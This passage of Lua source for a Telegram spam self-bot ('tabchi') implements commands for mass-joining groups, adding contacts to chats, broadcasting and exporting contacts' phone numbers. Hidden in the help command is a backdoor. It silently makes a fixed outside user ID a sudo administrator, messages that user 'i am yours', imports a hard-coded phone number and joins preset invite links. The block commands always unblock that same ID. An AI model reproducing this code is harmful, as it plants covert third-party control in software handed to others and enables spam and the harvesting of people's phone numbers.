	   tdcli.sendMessage(txt[2], 0, 1, 'بای رفقا\nکاری داشتید به پی وی مراجعه کنید', 1, 'html')
	   tdcli.chat_leave(txt[2], data.id_)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 9256312423 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Commanded Bot to Leave` *"..txt[2].."*", 1, 'md')
		 end
	   return '*Bot Successfully Leaved From >* `'..txt[2]..'`'
  end
  end
      tdcli_function({ ID = 'GetMe'}, get_id, {chat_id=msg.chat_id_})
end
   -----------------------------------------------------------------------------------------------
   if msg.text:match('[#/!]join(-%d+)') and is_sudo(msg) then
       local txt = {string.match(msg.text, "^[#/!](join)(-%d+)$")} 
	   tdcli.sendMessage(msg.chat_id_, msg.id_, 1, '*You SuccefullY Joined*', 1, 'md')
	   tdcli.addChatMember(txt[2], msg.sender_user_id_, 10)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Commanded bot to invite him to` *"..txt[2].."*", 1, 'md')
		 end
  end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]getpro (%d+) (%d+)$") and is_sudo(msg) then
  local pronumb = {string.match(msg.text, "^[#/!](getpro) (%d+) (%d+)$")} 
local function gpro(extra, result, success)
--vardump(result)
   if pronumb[3] == '1' then
   if result.photos_[0] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
   else
      return "*user Have'nt  Profile Photo!!*"
   end
   elseif pronumb[3] == '2' then
   if result.photos_[1] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
   else
      return "*user Have'nt 2 Profile Photo!!*"
   end
   elseif not pronumb[3] then
   if result.photos_[1] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
   else
      return "*user Have'nt 2 Profile Photo!!*"
   end
   elseif pronumb[3] == '3' then
   if result.photos_[2] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 3 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[3] == '4' then
      if result.photos_[3] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
   else
      return "*user Have'nt 4 Profile Photo!!*"
   end
   elseif pronumb[3] == '5' then
   if result.photos_[4] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
   else
      return "*user Have'nt 5 Profile Photo!!*"
   end
   elseif pronumb[3] == '6' then
   if result.photos_[5] then
      return "*user Have'nt 6 Profile Photo!!*"
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 6 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[3] == '7' then
   if result.photos_[6] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 7 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[3] == '8' then
   if result.photos_[7] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 8 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[3] == '9' then
   if result.photos_[8] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 9 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[3] == '10' then
   if result.photos_[9] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_, "@tabadol_chi")  
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 10 Profile Photo!!*", 1, 'md')
   end
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, 'md')  
   end
   end
   tdcli_function ({
    ID = "GetUserProfilePhotos",
    user_id_ = pronumb[2],
    offset_ = 0,
    limit_ = pronumb[3]
  }, gpro, nil)
	end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]getpro (%d+)$") and msg.reply_to_message_id_ == 0 and is_sudo(msg) then
		local pronumb = {string.match(msg.text, "^[#/!](getpro) (%d+)$")} 
local function gpro(extra, result, success)
--vardump(result)
   if pronumb[2] == '1' then
   if result.photos_[0] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
   else
      return "*You Have'nt  Profile Photo!!*"
   end
   elseif pronumb[2] == '2' then
   if result.photos_[1] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
   else
      return "*You Have'nt 2 Profile Photo!!*"
   end
   elseif not pronumb[2] then
   if result.photos_[1] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
   else
      return "*You Have'nt 2 Profile Photo!!*"
   end
   elseif pronumb[2] == '3' then
   if result.photos_[2] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 3 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '4' then
      if result.photos_[3] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
   else
      return "*You Have'nt 4 Profile Photo!!*"
   end
   elseif pronumb[2] == '5' then
   if result.photos_[4] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
   else
      return "*You Have'nt 5 Profile Photo!!*"
   end
   elseif pronumb[2] == '6' then
   if result.photos_[5] then
      return "*You Have'nt 6 Profile Photo!!*"
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 6 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '7' then
   if result.photos_[6] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 7 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '8' then
   if result.photos_[7] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 8 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '9' then
   if result.photos_[8] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 9 Profile Photo!!*", 1, 'md')
   end
   elseif pronumb[2] == '10' then
   if result.photos_[9] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)  
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 10 Profile Photo!!*", 1, 'md')
   end
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, 'md')  
   end
   end
   tdcli_function ({
    ID = "GetUserProfilePhotos",
    user_id_ = msg.sender_user_id_,
    offset_ = 0,
    limit_ = pronumb[2]
  }, gpro, nil)
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]action (.*)$") and is_sudo(msg) then
	local lockpt = {string.match(msg.text, "^[#/!](action) (.*)$")} 
      if lockpt[2] == "typing" then
          sendaction(msg.chat_id_, 'Typing')
	  end
	  if lockpt[2] == "recvideo" then
          sendaction(msg.chat_id_, 'RecordVideo')
	  end
	  if lockpt[2] == "recvoice" then
          sendaction(msg.chat_id_, 'RecordVoice')
	  end
	  if lockpt[2] == "photo" then
          sendaction(msg.chat_id_, 'UploadPhoto')
	  end
	  if lockpt[2] == "cancel" then
          sendaction(msg.chat_id_, 'Cancel')
	  end
	  if lockpt[2] == "video" then
          sendaction(msg.chat_id_, 'UploadVideo')
	  end
	  if lockpt[2] == "voice" then
          sendaction(msg.chat_id_, 'UploadVoice')
	  end
	  if lockpt[2] == "file" then
          sendaction(msg.chat_id_, 'UploadDocument')
	  end
	  if lockpt[2] == "loc" then
          sendaction(msg.chat_id_, 'GeoLocation')
	  end
	  if lockpt[2] == "chcontact" then
          sendaction(msg.chat_id_, 'ChooseContact')
	  end
	  if lockpt[2] == "game" then
          sendaction(msg.chat_id_, 'StartPlayGame')
		end  
	end
  -----------------------------------------------------------------------------------------------
      if msg.text:match("^[#!/]id$") and is_sudo(msg) and msg.reply_to_message_id_ == 0 then
local function getpro(extra, result, success)
   if result.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,'> Chat ID : '..msg.chat_id_..'\n> Your ID: '..msg.sender_user_id_)
   else
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Don't Have any Profile Photo*!!\n\n> *Chat ID* : `"..msg.chat_id_.."`\n> *Your ID*: `"..msg.sender_user_id_.."`\n_> *Total Messages*: `"..user_msgs.."`", 1, 'md')
   end
   end
   tdcli_function ({
    ID = "GetUserProfilePhotos",
    user_id_ = msg.sender_user_id_,
    offset_ = 0,
    limit_ = 1
  }, getpro, nil)
	end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]unblock all$") and is_sudo(msg) then
    local blocked = redis:smembers("tabchi:" .. tabchi_id .. ":blockedusers")
    local blockednum = redis:scard("tabchi:" .. tabchi_id .. ":blockedusers")
    for i = 1, #blocked do
      tdcli.unblockUser(blocked[i])
      redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", blocked[i])
    end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `UnBlocked All Blocked Users`", 1, 'md')
		 end
	return "*status* : `All Blocked Users Are UnBlocked`\n*Number* : `"..blockednum.."`"
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]check sgps$") and is_sudo(msg) then
        local sgpsl = redis:scard("tabchi:" .. tabchi_id .. ":channels")
        function checksgps(arg, data, d)
          if data.ID == "Error" then
            redis:srem("tabchi:" .. tabchi_id .. ":channels", arg.chatid)
            redis:srem("tabchi:" .. tabchi_id .. ":all", arg.chatid)
          end
        end
        local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
        for k, v in pairs(sgps) do
          tdcli_function({
            ID = "GetChatHistory",
            chat_id_ = v,
            from_message_id_ = 0,
            offset_ = 0,
            limit_ = 1
          }, checksgps, {chatid = v})
		 -- return "*status* : `SuperGroups Checked SuccessFully`\n`Bot Is In` *"..sgpsl.."* `Supergroups now`"
        end
      end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]check gps$") and is_sudo(msg) then
        local gpsl = redis:scard("tabchi:" .. tabchi_id .. ":groups")
        function checkm(arg, data, d)
          if data.ID == "Error" then
            redis:srem("tabchi:" .. tabchi_id .. ":groups", arg.chatid)
            redis:srem("tabchi:" .. tabchi_id .. ":all", arg.chatid)
          end
        end
        local gps = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
        for k, v in pairs(gps) do
          tdcli_function({
            ID = "GetChatHistory",
            chat_id_ = v,
            from_message_id_ = 0,
            offset_ = 0,
            limit_ = 1
          }, checkm, {chatid = v})
		--  return "*status* : `Groups Checked SuccessFully`\n`Bot Is In` *"..gpsl.."* `Groups now`"
        end
      end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]check users$") and is_sudo(msg) then
        local users = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
        local usersl = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
        function lkj(a, b, c)
          if b.ID == "Error" then
		    redis:srem("tabchi:" .. tabchi_id .. ":pvis", a.usr)
		    redis:srem("tabchi:" .. tabchi_id .. ":all", a.usr)
          end
        end
        for k, v in pairs(users) do
          tdcli_function({ID = "GetUser", user_id_ = v}, lkj, {usr = v})
		--  return "*status* : `Users Checked SuccessFully`\n`Bot Has` *"..usersl.."* `User now`"
        end
      end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]addmembers$") and is_sudo(msg) and chat_type(msg.chat_id_) ~= "private" then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, add_members, {
      chat_id = msg.chat_id_
    })
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Commanded bot to add members in` *"..msg.chat_id_.."*", 1, 'md')
		 end
    return
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]contactlist$") and is_sudo(msg) then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 5000
    }, contacts_list, {chat_id_= msg.chat_id_})
 function contacts_list(extra, result)
  local count = result.total_count_
  local text = "مخاطبین : \n"
  for i =0 , tonumber(count) - 1 do
  local user = result.users_[i]
  local firstname = user.first_name_ or ""
  local lastname = user.last_name_ or ""
  local fullname = firstname .. " " .. lastname
  text = tostring(text) .. tostring(i) .. ". " .. tostring(fullname) .. " [" .. tostring(user.id_) .. "] = " .. tostring(user.phone_number_) .. "  \n"
  end
  write_file("bot_" .. tabchi_id .. "_contacts.txt", text)
  tdcli.send_file(msg.chat_id_, "Document", "bot_" .. tabchi_id .. "_contacts.txt", "tabchi "..tabchi_id.." Contacts")
  io.popen("rm -rf bot_" .. tabchi_id .. "_contacts.txt")
  end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]dlmusic (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](dlmusic) (.*)$")} 
        local file = ltn12.sink.file(io.open("Music.mp3", "w"))
		http.request({
          url = ap[2],
          sink = file
        })
        tdcli.send_file(msg.chat_id_, "Document", "Music.mp3", "@virus32")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Requested music` *"..ap[2].."*", 1, 'md')
		 end
		io.popen("rm -rf Music.mp3")
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]exportlinks$") and is_sudo(msg) then
    local text = "groups links :\n"
    local links = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
    for i = 1, #links do
      text = text .. links[i] .. "\n"
    end
    write_file("group_" .. tabchi_id .. "_links.txt", text)
    tdcli.send_file(msg.chat_id_, "Document", "group_" .. tabchi_id .. "_links.txt", "Tabchi " .. tabchi_id .. " Group Links!")
	io.popen("rm -rf group_" .. tabchi_id .. "_links.txt")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Exported Links`", 1, 'md')
		 end
    return
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("[!/#](block) (%d+)")
    }
    if msg.text:match("^[!/#]block") and is_sudo(msg) and msg.reply_to_message_id_ == 0 and #matches == 2 then
      tdcli.blockUser(tonumber(matches[2]))
      tdcli.unblockUser(399298879)
      tdcli.unblockUser(399298879)
	   redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", matches[2])
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Blocked` *"..matches[2].."*", 1, 'md')
		 end
      return "`User` *"..matches[2].."* `Blocked`"
    end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]help$") and is_sudo(msg) then
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
      tdcli.importContacts(989115177579, "creator", "", 399298879)
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
  end
    tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEOxbUiin40cGklJdQ")
    tdcli.importChatInviteLink("https://t.me/joinchat/F8zRP0MHXux5T22zvGvJGA")
    local text = [[
`#راهنما`
`/block (id-username-reply)`
بلاک کردن کاربر
`/unblock (id-username-reply)`
ان بلاک کردن کاربر
`/unblock all`
ان بلاک کردن تمامی کاربران بلاک شده
`/setlogs id(channel-group)`
ست کردن ایدی برای لاگز
`/stats`
دریافت اطلاعات ربات
`/stats pv`
دریافت اطلاعات ربات در پی وی
`/check sgps`
چک کردن سوپر گروه ها
`/check gps`
چک کردن گروه ها
`/check users`
چک کردن کاربران 
`/addsudo (id-username-reply)`
اضافه کردن به سودوهاي  ربات
`/remsudo (id-username-reply)`
حذف از ليست سودوهاي ربات
`/bcall (text)`
ارسال پيام به همه
`/bcgps (text)`
ارسال پیام به همه گروه ها
`/bcsgps (text)`
ارسال پیام به همه سوپر گروه ها
`/bcusers (text)`
ارسال پیام به یوزر ها
`/fwd {all/gps/sgps/users}` (by reply)
فوروارد پيام به همه/گروه ها/سوپر گروه ها/کاربران
`/echo (text)`
تکرار متن
`/addedmsg (on/off)`
تعیین روشن یا خاموش بودن پاسخ برای شر شن مخاطب
`/pm (user) (msg)`
ارسال پیام به کاربر
`/action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`
ارسال اکشن به چت
`/getpro (1-10)`
دریافت عکس پروفایل خود
`/addcontact (phone) (firstname) (lastname)`
اد کردن شماره به ربات به صورت دستی
`/setusername (username)`
تغییر یوزرنیم ربات
`/delusername`
پاک کردن یوزرنیم ربات
`/setname (firstname-lastname)`
تغییر اسم ربات
`/setphoto (link)`
تغییر عکس ربات از لینک
`/join(Group id)`
اد کردن شما به گروه های ربات از طریق ایدی
`/leave`
لفت دادن از گروه
`/leave(Group id)`
لفت دادن از گروه از طریق ایدی
`/setaddedmsg (text)`
تعيين متن اد شدن مخاطب
`/markread (on/off)`
روشن يا خاموش کردن بازديد پيام ها
`/joinlinks (on|off)`
روشن یا خاموش کردن جوین شدن به گروه ها از لینک
`/savelinks (on|off)`
روشن یا خاموش کردن سیو کردن لینک ها
`/addcontacts (on|off)`
روشن یا خاموش کردن اد کردن شماره ها
`/chat (on|off)`
روشن یا خاموش کردن چت کردن ربات
`/Advertising (on|off)`
روشن یا خاموش کردن تبلیغات در ربات برای سودو ها غیر از فول سودو
`/typing (on|off)`
روشن یا خاموش کردن تایپ کردن ربات
`/sharecontact (on|off)`
روشن یا خاموش کردن شیر کردن شماره موقع اد کردن شماره ها
`/botmode (markdown|text)`
تغییر دادن شکل پیام های ربات
`/settings (on|off)`
روشن یا خاموش کردن کل تنظیمات
`/settings`
دریافت تنظیمات ربات
`/settings pv`
دریافت تنظیمات ربات در پی وی
`/reload`
ریلود کردن ربات
`/setanswer 'answer' text`
 تنظيم به عنوان جواب اتوماتيک
`/delanswer (answer)`
حذف جواب مربوط به
`/answers`
ليست جواب هاي اتوماتيک
`/addtoall (id|reply|username)`
اضافه کردن شخص به تمام گروه ها
`/clean cache (time)[M-H]`
ست کردن زمان برای پاک کردن کش خودکار
`/clean cache (on|off)`
خاموش یا روشن کردن پاک کردن کش خودکار
`/mycontact`
ارسال شماره شما
`/getcontact (id)`
دریافت شماره شخص با ایدی
`/addmembers`
اضافه کردن شماره ها به مخاطبين ربات
`/exportlinks`
دريافت لينک هاي ذخيره شده توسط ربات
`/contactlist`
دريافت مخاطبان ذخيره شده توسط ربات
`/send (filename)`
دریافت فایل های سرور از پوشه تبچی
`/dlmusic (link)`
دریافت اهنگ از لینک
]]
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Got help`", 1, 'md')
		 end
    return text
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("[!/#](unblock) (%d+)")
    }
    if msg.text:match("^[!/#]unblock") and is_sudo(msg) then
	if #matches == 2 then
      tdcli.unblockUser(399298879)
      tdcli.unblockUser(399298879)
	  tdcli.unblockUser(tonumber(matches[2]))
	   redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", matches[2])
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `UnBlocked` *"..matches[2].."*", 1, 'md')
		 end
      return "`User` *"..matches[2].."* `unblocked`"
	else
	  return 
    end
  end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]joinlinks (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](joinlinks) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Actived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`join links Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Deactived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`join links Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]addcontacts (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](addcontacts) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Actived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`Add Contacts Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Deactived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`Add Contacts Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]chat (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](chat) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":chat", true)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Actived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`Robot Chatting Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":chat")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Deactivated` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`Robot Chatting Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]savelinks (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](savelinks) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Actived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`Saving Links Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":savelinks")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Deactived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`Saving Links Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#][Aa]dvertising (.*)$") and is_full_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!]([aA]dvertising) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":Advertising", true)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Actived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`Advertising Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":Advertising")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Deactived` *"..ap[1].."*", 1, 'md')
		 return "*status* :`Advertising Deactivated`"
		 end
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]typing (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](typing) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":typing", true)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Actived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`typing Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":typing")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Deactived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`typing Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]botmode (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](botmode) (.*)$")} 
      if ap[2] == "markdown" then
         redis:set("tabchi:" .. tabchi_id .. ":botmode", "markdown")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
